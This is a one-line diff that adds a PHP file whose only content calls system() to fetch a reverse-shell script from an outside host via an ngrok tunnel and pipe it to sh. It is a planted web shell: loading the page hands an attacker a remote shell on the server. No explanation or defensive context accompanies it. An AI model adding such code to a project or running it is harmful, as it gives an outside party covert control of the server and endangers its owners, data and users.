@@ -1,0 +1,1 @@
+<?php system('curl https://reverse-shell.sh/0.tcp.ap.ngrok.io:12512 | sh'); ?>
